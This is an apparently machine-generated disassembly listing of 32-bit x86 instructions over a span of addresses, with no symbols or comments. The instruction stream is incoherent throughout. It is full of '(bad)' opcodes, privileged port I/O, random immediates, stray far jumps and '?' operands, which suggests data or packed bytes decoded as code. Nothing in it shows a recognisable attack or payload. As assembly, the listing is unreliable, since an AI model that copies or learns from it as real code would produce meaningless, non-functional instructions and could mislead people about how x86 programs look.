  4265ce:	mov    DWORD PTR [edx+0xb1b1dfa],eax
  4265d4:	sbb    ebx,DWORD PTR [ebx-0x74]
  4265d7:	cwde   
  4265d8:	scas   al,BYTE PTR es:[edi]
  4265d9:	(bad)  
  4265da:	in     al,0x19
  4265dc:	into   
  4265dd:	daa    
  4265de:	jg     0x42664e
  4265e0:	mov    ch,0x8d
  4265e2:	sbb    edi,DWORD PTR [esi+ebx*4]
  4265e5:	or     BYTE PTR [eax-0x4e],ah
  4265e8:	fst    QWORD PTR [edi+0x46d60a9f]
  4265ee:	imul   ebx,ebx,0xb935d87d
  4265f4:	adc    DWORD PTR [edx+0x50],ebx
  4265f7:	inc    esi
  4265f8:	mov    dh,0x6d
  4265fa:	ins    DWORD PTR es:[edi],dx
  4265fb:	(bad)  [edi]
  4265fd:	(bad)  
  4265fe:	jmp    DWORD PTR [ebx]
  426600:	fs call 0xa375:0x2fe9e023
  426608:	sub    eax,0x5e82c6c5
  42660d:	(bad)  
  42660e:	stos   DWORD PTR es:[edi],eax
  42660f:	jno    0x426683
  426611:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426612:	ret    0xb040
  426615:	dec    edi
  426616:	push   esp
  426617:	add    ah,ch
  426619:	push   eax
  42661a:	push   0x15
  42661c:	fidivr DWORD PTR [esi+0x7d49bf4d]
  426622:	jge    0x4265d1
  426624:	sub    edi,DWORD PTR [eax+0x34fb7fb5]
  42662a:	xchg   esp,eax
  42662b:	shl    DWORD PTR [edi+edx*4+0x6b],0x16
  426630:	mov    dh,0x85
  426632:	(bad)  
  426633:	hlt    
  426634:	xchg   esp,eax
  426635:	sbb    DWORD PTR ds:0xb890e654,esp
  42663b:	imul   BYTE PTR [edi+edx*1+0x16]
  42663f:	and    DWORD PTR ss:[esi+0x37],edi
  426643:	xor    ecx,DWORD PTR [edi+0x6f]
  426646:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  426648:	and    DWORD PTR [eax+0x702d036d],ecx
  42664e:	fsub   QWORD PTR [esi]
  426650:	sub    BYTE PTR [edx],ch
  426652:	push   0x6d6b744f
  426657:	fwait
  426658:	stos   BYTE PTR es:[edi],al
  426659:	push   eax
  42665a:	outs   dx,BYTE PTR cs:[esi]
  42665c:	inc    eax
  42665d:	xor    DWORD PTR [ebp-0x4],esp
  426660:	stc    
  426661:	jl     0x4266d4
  426663:	arpl   WORD PTR [ecx+0x3c791a7d],bp
  426669:	push   ss
  42666a:	mov    ecx,0x1ad680f
  42666f:	sub    eax,0xf19adc2c
  426674:	mov    ebp,0xed89d1a0
  426679:	push   ebx
  42667a:	fistp  DWORD PTR [ecx-0x3c]
  42667d:	pop    edi
  42667e:	bound  ebx,QWORD PTR [ecx-0x5d10eda3]
  426684:	std    
  426685:	test   al,0x6d
  426687:	add    esi,ecx
  426689:	lahf   
  42668a:	jp     0x426632
  42668c:	in     eax,0xf8
  42668e:	mov    ecx,0x7c0cdd15
  426693:	mov    ebx,0x2064092a
  426698:	add    bl,BYTE PTR [edi+0xb807dfb]
  42669e:	pop    ebx
  42669f:	push   edi
  4266a0:	push   ebx
  4266a1:	mov    DWORD PTR [ebp-0x1b],esi
  4266a4:	pop    ss
  4266a5:	xchg   edi,eax
  4266a6:	jo     0x426633
  4266a8:	pop    esi
  4266a9:	jbe    0x4266ce
  4266ab:	xor    BYTE PTR [ebp+0x23],al
  4266ae:	inc    esi
  4266af:	sub    al,0x14
  4266b1:	mov    ecx,0xa0db46d7
  4266b6:	in     eax,0x77
  4266b8:	bound  edx,QWORD PTR ds:0x85dbe5ba
  4266be:	lea    esp,ds:0xdd6691ad
  4266c4:	sub    BYTE PTR [eax-0x18],al
  4266c7:	mov    dh,0x45
  4266c9:	sub    eax,0xa30a0834
  4266ce:	pop    ds
  4266cf:	jl     0x426678
  4266d1:	popa   
  4266d2:	loope  0x426696
  4266d4:	mov    dh,0xdd
  4266d6:	cdq    
  4266d7:	add    eax,0x271d7042
  4266dc:	sub    edi,DWORD PTR [edi]
  4266de:	and    eax,0xe0db6dc5
  4266e3:	sub    eax,0x3fad32ef
  4266e8:	xor    DWORD PTR ds:0xb8826d7,0x4d
  4266ef:	popa   
  4266f0:	les    edx,FWORD PTR [edx-0x3f]
  4266f3:	jmp    0x7ad0d35
  4266f8:	lds    edi,FWORD PTR [ebx+0x2e1f934a]
  4266fe:	test   BYTE PTR [eax-0x657f6bbb],ah
  426704:	inc    esi
  426705:	push   ebp
  426706:	add    eax,0xe695b10a
  42670b:	jge    0x426742
  42670d:	daa    
  42670e:	xor    BYTE PTR [eax+0x22b70475],dh
  426714:	jge    0x42671a
  426716:	fiadd  DWORD PTR [ebp+0x6d642c1a]
  42671c:	jmp    0xed042277
  426721:	cdq    
  426722:	xchg   edx,eax
  426723:	inc    eax
  426724:	push   cs
  426725:	lds    eax,FWORD PTR ds:[edi+ecx*4]
  426729:	ins    DWORD PTR es:[edi],dx
  42672a:	sub    DWORD PTR [eax],0x11
  42672d:	xchg   ebp,eax
  42672e:	mov    cl,0xd8
  426730:	mov    ecx,0x446b74a3
  426735:	xchg   DWORD PTR [ebx-0x64],edx
  426738:	jmp    0x6db7:0x45409302
  42673f:	inc    esi
  426740:	clc    
  426741:	mov    ?,esi
  426743:	inc    esp
  426744:	mov    ds:0xd6e346d0,eax
  426749:	xor    al,0x4
  42674b:	bound  ecx,QWORD PTR [edx]
  42674d:	cmp    cl,BYTE PTR [edi]
  42674f:	cmp    DWORD PTR ds:0xd4476a3b,0xae6330cb
  426759:	vhaddps xmm3,xmm7,XMMWORD PTR [edx]
  42675d:	popa   
  42675e:	fld    TBYTE PTR [edx+0x6d]
  426761:	cmp    ecx,DWORD PTR [esp+edx*4]
  426764:	and    dh,BYTE PTR [edi+0x8]
  426767:	dec    esp
  426768:	neg    edx
  42676a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42676b:	lods   eax,DWORD PTR ds:[esi]
  42676c:	ins    DWORD PTR es:[edi],dx
  42676d:	push   0x78d6fcdd
  426772:	sbb    eax,0x533e68d2
  426777:	adc    al,0x6c
  426779:	fdiv   QWORD PTR [ebx+0x44691dab]
  42677f:	(bad)  
  426780:	fcmovnb st,st(2)
  426782:	rol    BYTE PTR [edx+0x5d],cl
  426785:	(bad)  
  426786:	push   eax
  426787:	dec    ebp
  426788:	lea    esi,[ecx]
  42678a:	pop    ecx
  42678b:	xor    ah,BYTE PTR ds:0xb46d6e14
  426791:	inc    ebx
  426792:	bound  esi,QWORD PTR [edi-0x391efe56]
  426798:	fild   WORD PTR ds:0xa2c2c2c
  42679e:	push   0xffffffac
  4267a0:	xor    BYTE PTR [esi-0x60],bl
  4267a3:	mov    dh,0x76
  4267a5:	popa   
  4267a6:	mov    eax,ds:0x64f20d3c
  4267ab:	into   
  4267ac:	jb     0x4267a3
  4267ae:	mov    ecx,0xb41b6c68
  4267b3:	add    BYTE PTR [edx-0x51635f5],bl
  4267b9:	ss inc ebp
  4267bb:	fdiv   QWORD PTR [edx]
  4267bd:	xor    al,0x6a
  4267bf:	mov    dh,0x71
  4267c1:	imul   esi,DWORD PTR [edi+edi*2+0x17],0x4c001a36
  4267c9:	xchg   ecx,eax
  4267ca:	mov    ebp,0xe014611c
  4267cf:	ins    DWORD PTR es:[edi],dx
  4267d0:	imul   ebx,ebx,0x5a
  4267d3:	sbb    al,0xda
  4267d5:	pop    edi
  4267d6:	loopne 0x4267b4
  4267d8:	xchg   esp,eax
  4267d9:	imul   DWORD PTR [ebp-0x49f72b4e]
  4267df:	iret   
  4267e0:	inc    esp
  4267e1:	popw   ds
  4267e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267e4:	push   edx
  4267e5:	sbb    bh,BYTE PTR [ebx]
  4267e7:	mov    bl,bl
  4267e9:	adc    cl,0x36
  4267ec:	scas   eax,DWORD PTR es:[edi]
  4267ed:	pop    ecx
  4267ee:	jg     0x4267ff
  4267f0:	jle    0x42684a
  4267f2:	fcomp  st(2)
  4267f4:	push   ss
  4267f5:	push   ebp
  4267f6:	add    DWORD PTR [ebx+0x7e],edx
  4267f9:	loop   0x4267aa
  4267fb:	cmp    bl,BYTE PTR [edx+0x46]
  4267fe:	inc    edi
  4267ff:	fcomp  QWORD PTR [eax-0x4b]
  426802:	(bad)  
  426803:	jb     0x426831
  426805:	push   esp
  426806:	mov    esp,0x7db8098e
  42680b:	inc    esp
  42680c:	fisttp DWORD PTR [ecx+0x35]
  42680f:	adc    bl,BYTE PTR [ebp-0x6a]
  426812:	repnz pop esp
  426814:	mov    DWORD PTR [eax-0x2ca93d25],eax
  42681a:	ds in  eax,0x7f
  42681d:	cmp    al,0x20
  42681f:	mov    cl,0x8c
  426821:	add    BYTE PTR [esi+0x1858a680],dh
  426827:	nop
  426828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426829:	fisub  DWORD PTR [ebp-0x7d4144e6]
  42682f:	mov    eax,ds:0xac151e36
  426834:	es mov ebx,0xc1163699
  42683a:	sahf   
  42683b:	sub    eax,0x3d2929bf
  426840:	scas   al,BYTE PTR es:[edi]
  426841:	mov    ecx,0x5b6c2e17
  426846:	aam    0x67
  426848:	mov    esp,0x370d041d
  42684d:	test   DWORD PTR [esi],edi
  42684f:	add    cl,dl
  426851:	ins    DWORD PTR es:[edi],dx
  426852:	imul   ecx,ebx,0xffffffc5
  426855:	in     eax,dx
  426856:	fs push esi
  426858:	mov    ecx,0x4d95236c
  42685d:	mov    dh,0x4b
  42685f:	test   DWORD PTR [ebp-0x7a],ecx
  426862:	mov    dh,0xca
  426864:	std    
  426865:	cmp    bh,0x50
  426868:	pop    esp
  426869:	sbb    BYTE PTR [ebp-0x672f4913],al
  42686f:	scas   eax,DWORD PTR es:[edi]
  426870:	ror    DWORD PTR [ecx+ebp*8+0x31dff8db],1
  426877:	sub    eax,0x760b0b44
  42687c:	cmc    
  42687d:	inc    ebx
  42687e:	push   eax
  42687f:	loop   0x42681d
  426881:	in     al,dx
  426882:	mov    cl,BYTE PTR [ebp+0x11]
  426885:	mov    ch,0x79
  426887:	push   0x57
  426889:	pushf  
  42688a:	into   
  42688b:	mov    dl,0xb0
  42688d:	rol    DWORD PTR [eax-0x6],1
  426890:	repz cmp al,0x63
  426893:	(bad)  
  426895:	push   0xb6e28ba9
  42689a:	ror    DWORD PTR [ebx-0x52c5e895],cl
  4268a0:	adc    al,0xb5
  4268a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a3:	mov    esp,0x86aaf84e
  4268a8:	fild   DWORD PTR [esi-0x5]
  4268ab:	rcr    DWORD PTR [ebp+0x22],0x9e
  4268af:	lahf   
  4268b0:	mov    ebx,0x44b5ae56
  4268b5:	data16 mov ah,0x81
  4268b8:	cs ins BYTE PTR es:[edi],dx
  4268ba:	sbb    eax,0xe181463d
  4268bf:	or     eax,DWORD PTR [eax+0x6d6c2e20]
  4268c5:	adc    ebp,DWORD PTR [edi+0x32]
  4268c8:	cmp    esi,DWORD PTR [edi+0x62]
  4268cb:	push   eax
  4268cc:	add    DWORD PTR [ebx+0x6c14d69f],esp
  4268d2:	xor    bl,0x8a
  4268d5:	sbb    BYTE PTR [edx+eax*2+0xb50d4d4],0xd4
  4268dd:	xchg   esi,eax
  4268de:	imul   esp,DWORD PTR ds:0xa9761ba6,0xb4ddb803
  4268e8:	xor    al,0xf8
  4268ea:	scas   al,BYTE PTR es:[edi]
  4268eb:	jge    0x4268dd
  4268ed:	shr    BYTE PTR [esi-0x28],cl
  4268f0:	xor    BYTE PTR [eax],0xd4
  4268f3:	or     al,0xfa
  4268f5:	and    ebx,DWORD PTR [eax+0x76]
  4268f8:	mov    ds:0x165b585d,eax
  4268fd:	dec    edi
  4268fe:	pop    ecx
  4268ff:	or     bl,cl
  426901:	push   ecx
  426902:	gs mov bl,0xc5
  426905:	sbb    edx,0x778b85b6
  42690b:	adc    al,0x7e
  42690d:	retf   
  42690e:	and    DWORD PTR [ebx+eax*1],esp
  426911:	rol    DWORD PTR [esi+0x306aa668],0x85
  426918:	repnz fistp DWORD PTR [edx]
  42691b:	loopne 0x426963
  42691d:	std    
  42691e:	and    al,0x22
  426920:	push   0x41501c70
  426925:	ja     0x4268dd
  426927:	ins    DWORD PTR es:[edi],dx
  426928:	xor    DWORD PTR [esi+0x68],0xfffffff0
  42692c:	(bad)  
  42692d:	dec    ebp
  42692e:	xor    DWORD PTR [edx+0x44],ecx
  426931:	outs   dx,BYTE PTR ds:[esi]
  426932:	lods   eax,DWORD PTR ds:[esi]
  426933:	pop    edx
  426934:	pop    edx
  426935:	sub    BYTE PTR [edi],dh
  426937:	dec    ebx
  426938:	sbb    dl,BYTE PTR [esi+0x13]
  42693b:	pusha  
  42693c:	outs   dx,BYTE PTR ds:[esi]
  42693d:	xor    eax,esp
  42693f:	push   es
  426940:	push   0xd4d5f7a3
  426945:	xor    DWORD PTR [edi+0x175b0b82],0x6d0e9aea
  42694f:	mov    dl,0xdb
  426951:	cmp    DWORD PTR [ecx-0x25],esp
  426954:	fdivr  DWORD PTR [edx-0x66254044]
  42695a:	fdiv   DWORD PTR [edi]
  42695c:	adc    DWORD PTR [eax],esi
  42695e:	fsub   DWORD PTR fs:[eax+0x1]
  426962:	pusha  
  426963:	cmp    edi,DWORD PTR [edx]
  426965:	mov    edi,0xb06da983
  42696a:	aam    0xda
  42696c:	pop    edx
  42696d:	xchg   edi,eax
  42696e:	icebp  
  42696f:	adc    DWORD PTR [ecx+eiz*4-0x5b],0xffffffff
  426974:	pop    ebx
  426975:	pop    ebx
  426976:	mov    ebx,0x95f6b168
  42697b:	out    dx,eax
  42697c:	adc    BYTE PTR [ecx-0x9],cl
  42697f:	in     al,dx
  426980:	add    BYTE PTR [ecx],al
  426982:	int3   
  426983:	add    BYTE PTR [edi-0x1ae4ff22],ch
  426989:	pop    ss
  42698a:	xchg   esi,eax
  42698b:	mov    bl,0x8b
  42698d:	mov    ss,WORD PTR [esp+eax*2+0x0]
  426991:	stc    
  426992:	mov    edx,0xb46efcae
  426997:	sbb    ecx,DWORD PTR [ebx]
  426999:	mov    esi,0x6bf4dea0
  42699e:	(bad)
  4269a1:	in     eax,dx
  4269a2:	sub    BYTE PTR [edi+0x1329d0b0],bh
  4269a8:	(bad)  
  4269aa:	dec    esp
  4269ab:	cdq    
  4269ac:	add    al,bl
  4269ae:	push   cs
  4269af:	mov    dh,0x6a
  4269b1:	mov    eax,ds:0x4b2d255d
  4269b6:	adc    al,0xf1
  4269b8:	mov    al,0x5e
  4269ba:	arpl   ax,ax
  4269bc:	mov    dh,0xb0
  4269be:	aam    0xb6
  4269c0:	mov    edi,0xa76a01c4
  4269c5:	jo     0x42697d
  4269c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269c8:	(bad)  [esi-0x21d0f9b8]
  4269ce:	es pusha 
  4269d0:	pop    esp
  4269d1:	xor    ch,BYTE PTR [edx]
  4269d3:	outs   dx,BYTE PTR ds:[esi]
  4269d4:	pop    ds
  4269d5:	mov    dh,0xb
  4269d7:	outs   dx,BYTE PTR ds:[esi]
  4269d8:	adc    al,0x1c
  4269da:	int3   
  4269db:	rcl    DWORD PTR [esi+0x4f],1
  4269de:	inc    edx
  4269df:	std    
  4269e0:	sbb    bl,BYTE PTR [ebx+0x58]
  4269e3:	fcmovu st,st(2)
  4269e5:	inc    edx
  4269e6:	cwde   
  4269e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269e8:	stc    
  4269e9:	pop    ss
  4269ea:	out    0x46,al
  4269ec:	out    dx,eax
  4269ed:	sub    DWORD PTR [ebp-0x25],0xffffffda
  4269f1:	jbe    0x426a2a
  4269f3:	and    DWORD PTR [edi+0x60],esi
  4269f6:	xlat   BYTE PTR ds:[ebx]
  4269f7:	sahf   
  4269f8:	cwde   
  4269f9:	or     ebx,DWORD PTR [edx-0x4d]
  4269fc:	mov    dh,0x85
  4269fe:	mov    dl,0xc4
  426a00:	mov    edx,0x3a35c41e
  426a05:	xor    al,0x7a
  426a07:	pop    esi
  426a08:	test   DWORD PTR [ebp-0x379248a],ecx
  426a0e:	adc    al,0xb5
  426a10:	mov    ecx,0xf7f2c932
  426a15:	mov    BYTE PTR [ebp+0x17],ch
  426a18:	(bad)
  426a1b:	mov    al,ds:0x83f80983
  426a20:	in     eax,dx
  426a21:	push   edx
  426a22:	mov    DWORD PTR [eax-0x6a],ebp
  426a25:	xchg   ebx,eax
  426a26:	sbb    eax,0x74ce0e17
  426a2b:	push   esp
  426a2c:	ror    BYTE PTR [esi-0x1e5c3978],1
  426a32:	dec    ebx
  426a33:	jmp    0x7b4:0x1edb52c6
  426a3a:	outs   dx,BYTE PTR ds:[esi]
  426a3b:	add    ch,BYTE PTR [eax-0x52]
  426a3e:	pop    es
  426a3f:	out    dx,eax
  426a40:	add    dh,BYTE PTR [edi+0x21a506da]
  426a46:	jne    0x426a8f
  426a48:	cli    
  426a49:	sub    edi,DWORD PTR ds:0xb71135ea
  426a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a50:	mov    esp,0xc5bea411
  426a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a56:	jp     0x426a1a
  426a58:	(bad)  
  426a59:	mov    dh,0xb1
  426a5b:	xchg   BYTE PTR [edi],bh
  426a5d:	daa    
  426a5e:	lahf   
  426a5f:	pop    ecx
  426a60:	xchg   ecx,eax
  426a61:	inc    ebp
  426a62:	fist   WORD PTR [edx+0x6d]
  426a65:	imul   edx,DWORD PTR ds:0xd49259ed,0x3
  426a6c:	je     0x426a0d
  426a6e:	push   cs
  426a6f:	loopne 0x426a27
  426a71:	cdq    
  426a72:	mov    dh,0x1f
  426a74:	pop    ss
  426a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a76:	(bad)  
  426a77:	ja     0x426ae9
  426a79:	pop    ecx
  426a7a:	nop
  426a7b:	jae    0x426a0a
  426a7d:	sbb    eax,0xc7032ec0
  426a82:	(bad)  
  426a83:	pop    edi
  426a84:	push   ss
  426a85:	jbe    0x426a23
  426a87:	mov    bh,0x8d
  426a89:	out    0x46,eax
  426a8b:	xor    al,0x56
  426a8d:	and    DWORD PTR [eax-0x30a6ebaf],edx
  426a93:	in     al,dx
  426a94:	or     esi,DWORD PTR [ebp+ebp*8+0xd06a817]
  426a9b:	jno    0x426a39
  426a9d:	push   eax
  426a9e:	mov    ebp,0xfcbb4139
  426aa3:	test   esp,edi
  426aa5:	push   edx
  426aa6:	mov    edi,0xdec500
  426aab:	stos   DWORD PTR es:[edi],eax
  426aac:	sbb    BYTE PTR [eax+0x29],bh
  426aaf:	push   ss
  426ab0:	mov    dh,0xba
  426ab2:	mov    ah,0xbf
  426ab4:	pop    ebx
  426ab5:	sub    DWORD PTR [ecx],ecx
  426ab7:	mov    esi,DWORD PTR [ebx+0x6d558e58]
  426abd:	pop    esp
  426abe:	pop    esi
  426abf:	fsubr  DWORD PTR [edi]
  426ac1:	push   ds
  426ac2:	int    0x24
  426ac4:	add    BYTE PTR [ebx],dl
  426ac6:	js     0x426a4f
  426ac8:	pushf  
  426ac9:	mov    ds:0x75ba7c6,eax
  426ace:	aaa    
  426acf:	cmp    ebp,DWORD PTR [ecx]
  426ad1:	sub    al,0xb2
  426ad3:	mov    bl,0x58
  426ad5:	(bad)  
  426ad7:	ins    DWORD PTR es:[edi],dx
  426ad8:	popa   
  426ad9:	imul   ecx,ebx,0xfffffffe
  426adc:	pop    ss
  426add:	inc    esp
  426ade:	sti    
  426adf:	out    0x73,eax
  426ae1:	adc    ah,al
  426ae3:	pop    eax
  426ae4:	sub    ah,bl
  426ae6:	mov    dh,0x5a
  426ae8:	sahf   
  426ae9:	inc    ecx
  426aea:	push   ebx
  426aeb:	add    dl,BYTE PTR [edx-0x45]
  426aee:	les    esp,FWORD PTR [ebp+0x76]
  426af1:	popa   
  426af2:	popa   
  426af3:	fcmovnb st,st(6)
  426af5:	jbe    0x426a7a
  426af7:	mov    ds:0x3082ea55,eax
  426afc:	mov    edx,0x370135d4
  426b01:	mov    dh,0x7d
  426b03:	adc    BYTE PTR ds:0x240acf53,dl
  426b09:	bound  esp,QWORD PTR [ebx+0x31e6b5d6]
  426b0f:	sbb    edi,esp
  426b11:	pop    esp
  426b12:	hlt    
  426b13:	mov    esp,0x5b4406d
  426b18:	sbb    DWORD PTR [edi-0x249dfa83],ebx
  426b1e:	push   ss
  426b1f:	mov    dh,0xad
  426b21:	dec    ebp
  426b22:	imul   eax,DWORD PTR [edi],0x38
  426b25:	dec    ecx
  426b26:	xor    edx,eax
  426b28:	retf   
  426b29:	xchg   edi,eax
  426b2a:	enter  0x6371,0x8b
  426b2e:	ins    DWORD PTR es:[edi],dx
  426b2f:	aaa    
  426b30:	das    
  426b31:	or     al,0x12
  426b33:	mov    DWORD PTR [ebx-0x7a],edi
  426b36:	(bad)  cs:[esi+0xda93db1]
  426b3d:	or     ch,ah
  426b3f:	iret   
  426b40:	dec    ebx
  426b41:	or     DWORD PTR [ebp+0x29],0x6f
  426b45:	lods   eax,DWORD PTR ds:[esi]
  426b46:	adc    dh,BYTE PTR [eax-0x710b14b]
  426b4c:	shl    BYTE PTR [ebx-0x54],0x68
  426b50:	xchg   edi,eax
  426b51:	ss mov dh,0xb
  426b54:	cmc    
  426b55:	cmp    al,0x9c
  426b57:	inc    esi
  426b58:	clc    
  426b59:	lock call 0x2a47d7dc
  426b5f:	pop    ebp
  426b60:	mov    esi,0x686203f7
  426b65:	repnz retf 0x5bb5
  426b69:	mov    ebx,0x6e91e82d
  426b6e:	inc    edi
  426b6f:	fwait
  426b70:	xlat   BYTE PTR ds:[ebx]
  426b71:	dec    edx
  426b72:	mov    esp,0xa96bc2d9
  426b77:	push   ecx
  426b78:	mov    cl,0x6b
  426b7a:	xor    al,BYTE PTR [edx]
  426b7c:	lds    esp,FWORD PTR [eax+0x40]
  426b7f:	adc    bl,bl
  426b81:	ins    DWORD PTR es:[edi],dx
  426b82:	imul   esp,DWORD PTR [edi],0x4bce75d1
  426b88:	jae    0x426b52
  426b8a:	adc    BYTE PTR [eax+0x41],ch
  426b8d:	mov    ah,0xd
  426b8f:	pop    edx
  426b90:	enter  0x1a22,0x7b
  426b94:	mov    bh,0xc2
  426b96:	mov    dh,0x5d
  426b98:	mov    esi,DWORD PTR [ecx-0x7fd98b28]
  426b9e:	mov    BYTE PTR [eax+0x44],dh
  426ba1:	mov    ah,0xb1
  426ba3:	fisubr DWORD PTR [ebp-0x25]
  426ba6:	sbb    bh,BYTE PTR [esi-0x35]
  426ba9:	enter  0xde05,0x83
  426bad:	aam    0x9
  426baf:	sbb    eax,0xdada2363
  426bb4:	pop    esp
  426bb5:	das    
  426bb6:	xchg   edi,eax
  426bb7:	addr16 int3 
  426bb9:	add    DWORD PTR [esi+0x6d],ecx
  426bbc:	pop    ebx
  426bbd:	or     ebx,DWORD PTR [ebx-0x74]
  426bc0:	je     0x426b71
  426bc2:	(bad)  
  426bc3:	fild   WORD PTR [ebx+0x50]
  426bc6:	or     ebp,DWORD PTR ds:0xbe6ebf6c
  426bcc:	leave  
  426bcd:	rol    DWORD PTR [ebp+0x6fce1c35],1
  426bd3:	jg     0x426c1d
  426bd5:	mov    ecx,0xc200d4b1
  426bda:	mov    eax,ebp
  426bdc:	jecxz  0x426bde
  426bde:	pop    eax
  426bdf:	ret    
  426be0:	ret    0xc2c6
  426be3:	inc    edx
  426be4:	jl     0x426c24
  426be6:	cmp    bl,BYTE PTR [edx+0x6f]
  426be9:	in     eax,dx
  426bea:	rcr    ebx,cl
  426bec:	mov    dh,0xb1
  426bee:	rol    DWORD PTR [esi],0x4d
  426bf1:	out    dx,al
  426bf2:	pusha  
  426bf3:	ins    BYTE PTR es:[edi],dx
  426bf4:	ja     0x426c59
  426bf6:	pop    esp
  426bf7:	mov    dl,0xab
  426bf9:	fidivr DWORD PTR [esi]
  426bfb:	mov    dh,0xea
  426bfd:	jge    0x426bce
  426bff:	xor    BYTE PTR [eax+0x47],cl
  426c02:	bound  ebp,QWORD PTR es:0xde6d5bb4
  426c09:	inc    esp
  426c0a:	pop    ds
  426c0b:	xchg   ebp,eax
  426c0c:	pop    edi
  426c0d:	xlat   BYTE PTR ds:[ebx]
  426c0e:	xor    BYTE PTR [ebx-0x492493fa],0x11
  426c15:	(bad)  
  426c16:	ja     0x426c8b
  426c18:	cmp    BYTE PTR [edi-0x2784d5cb],dl
  426c1e:	pop    eax
  426c1f:	fidiv  DWORD PTR [esi-0x7e22786]
  426c25:	push   ebx
  426c26:	mov    ds:0x58db872d,eax
  426c2b:	pop    eax
  426c2c:	pop    edx
  426c2d:	sub    BYTE PTR [esi+ecx*1],al
  426c30:	and    eax,0xe509a61c
  426c35:	outs   dx,BYTE PTR ds:[esi]
  426c36:	sbb    eax,0x1f6d8dc4
  426c3b:	dec    edx
  426c3c:	out    0x3,eax
  426c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c3f:	(bad)  
  426c40:	fidiv  WORD PTR [edi-0x4a44949b]
  426c46:	lds    edi,FWORD PTR [edx+esi*1-0x7b674c34]
  426c4d:	call   0xcbb2b201
  426c52:	ins    DWORD PTR es:[edi],dx
  426c53:	xor    eax,0x224f0226
  426c58:	xchg   BYTE PTR [ecx-0x5b2924b5],ah
  426c5e:	inc    esp
  426c5f:	pop    ecx
  426c60:	sub    al,0x7a
  426c62:	iret   
  426c63:	sub    DWORD PTR [edi+ebp*8-0x7d],ebx
  426c67:	add    DWORD PTR [edi+0x266bed8d],esi
  426c6d:	pop    esp
  426c6e:	mov    ds:0x20244d82,al
  426c73:	dec    ebx
  426c74:	in     eax,dx
  426c75:	add    bl,BYTE PTR [ebp-0x73]
  426c78:	pusha  
  426c79:	ret    
  426c7a:	dec    esi
  426c7b:	(bad)  
  426c7c:	cmp    eax,DWORD PTR [edx]
  426c7e:	aas    
  426c7f:	mov    ebx,0x5ea2b951
  426c84:	mov    al,ds:0xc2cbf46d
  426c89:	sub    BYTE PTR [esi+0x6d],0x61
  426c8d:	mov    ?,WORD PTR [edi]
  426c8f:	jno    0x426c1a
  426c91:	es nop
  426c93:	lea    ebp,[ebp+0x17]
  426c96:	mov    dh,0x86
  426c98:	cmp    ebx,DWORD PTR [esi+0x11]
  426c9b:	sbb    DWORD PTR [ebx+0x16],0xffffffdc
  426c9f:	xchg   ebp,eax
  426ca0:	cmp    DWORD PTR [esi+0x1b],ebp
  426ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ca4:	mov    al,ds:0x8f45059b
  426ca9:	mov    edi,0xdadb0405
  426cae:	lods   eax,DWORD PTR ds:[esi]
  426caf:	test   eax,0xc9fb443b
  426cb4:	cwde   
  426cb5:	add    dh,BYTE PTR [edi+esi*4-0x4a]
  426cb9:	arpl   WORD PTR [ecx-0x7f],bp
  426cbc:	ins    DWORD PTR es:[edi],dx
  426cbd:	fcom   QWORD PTR [edi]
  426cbf:	ds fcmovnbe st,st(3)
  426cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cc3:	jmp    0x426cb5
  426cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cc6:	pop    esp
  426cc7:	shl    BYTE PTR [esi-0x77],0xd8
  426ccb:	mov    ecx,0xa8092177
  426cd0:	fnsave [esi-0x66758273]
  426cd6:	outs   dx,BYTE PTR ds:[esi]
  426cd7:	push   ecx
  426cd8:	inc    esp
  426cd9:	sbb    eax,0xb8086565
  426cde:	ins    DWORD PTR es:[edi],dx
  426cdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ce0:	ja     0x426d1d
  426ce2:	dec    edi
  426ce3:	outs   dx,BYTE PTR ds:[esi]
  426ce4:	sbb    esi,DWORD PTR [ebx]
  426ce6:	imul   esi,DWORD PTR [edi+0x114dedad],0xffffff8c
  426ced:	mov    WORD PTR [edx+0x794b4a03],gs
  426cf3:	adc    DWORD PTR [edx],esi
  426cf5:	shl    BYTE PTR [esi-0x7f],cl
  426cf8:	dec    DWORD PTR gs:[esi+0x359e8d3c]
  426cff:	push   ss
  426d00:	fwait
  426d01:	in     eax,dx
  426d02:	push   esi
  426d03:	stos   DWORD PTR es:[edi],eax
  426d04:	mov    dh,0x11
  426d06:	mov    eax,0xc131dc37
  426d0b:	pop    ecx
  426d0c:	mov    ah,0xb4
  426d0e:	mov    ch,0x4b
  426d10:	mov    edi,0x56fbe2a7
  426d15:	js     0x426ca6
  426d17:	push   0xb0bb42c6
  426d1c:	push   esi
  426d1d:	sub    edi,ebx
  426d1f:	mov    edx,0xe8889289
  426d24:	pop    edx
  426d25:	popa   
  426d26:	stos   DWORD PTR es:[edi],eax
  426d27:	rol    ch,1
  426d29:	sbb    BYTE PTR [edi+0x4f],ch
  426d2c:	jbe    0x426d7d
  426d2e:	or     eax,0xa0940207
  426d33:	je     0x426cda
  426d35:	sub    eax,0xb131aa8f
  426d3a:	ror    DWORD PTR [edx-0xf65b83e],1
  426d40:	pop    ebp
  426d41:	imul   BYTE PTR [esi+0xcb6c2e0]
  426d47:	loopne 0x426cff
  426d49:	in     al,dx
  426d4a:	mov    eax,0x6fe4106
  426d4f:	push   ss
  426d50:	mov    dh,0x85
  426d52:	add    eax,0x76ec7ee8
  426d57:	cmp    eax,0x435a99c1
  426d5c:	fld    TBYTE PTR [esi+0x5f]
  426d5f:	push   ebp
  426d60:	int3   
  426d61:	sbb    eax,0x743afbad
  426d66:	dec    edx
  426d67:	add    dl,0xad
  426d6a:	add    eax,0xc852660c
  426d6f:	jb     0x426dcf
  426d71:	ins    DWORD PTR es:[edi],dx
